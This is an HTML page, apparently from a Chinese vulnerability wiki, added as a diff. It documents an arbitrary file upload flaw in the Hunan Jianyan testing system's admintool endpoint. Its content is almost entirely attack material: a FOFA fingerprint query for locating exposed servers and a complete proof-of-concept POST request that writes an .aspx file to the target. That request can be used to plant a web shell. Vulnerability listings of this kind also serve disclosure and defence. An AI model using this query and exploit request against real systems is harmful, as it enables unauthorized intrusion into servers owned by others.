@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-admintool-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>湖南建研 检测系统 admintool 任意文件上传 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6e56\u5357\u5efa\u7814-\u68c0\u6d4b\u7cfb\u7edf admintool \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8DownLoad2.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8DownLoad2.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20admintool%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20admintool%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        湖南建研-检测系统 admintool 存在任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="-admintool">湖南建研-检测系统 admintool 任意文件上传<a class="headerlink" href="#-admintool" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>body=&quot;/Content/Theme/Standard/webSite/login.css&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /Scripts/admintool?type=updatefile HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+Content-Length: 41
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate, br
+
+filePath=dmvckiil.aspx&amp;fileContent=123123
+</code></pre></div>
+<img alt="7c62372ac4c93cda2a5dbc1ab4b5a986" src="https://github.com/wy876/POC/assets/139549762/c36d1b3f-f839-40c3-a6ab-23669a0b89dd" /></p>
+<p><img alt="940cc53a8930c36235859b455f3983ca" src="https://github.com/wy876/POC/assets/139549762/097b6b6f-1cde-4aad-96f7-7e70a0f6bbe0" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8DownLoad2.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8DownLoad2.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20admintool%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20admintool%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        湖南建研-检测系统 admintool 存在任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
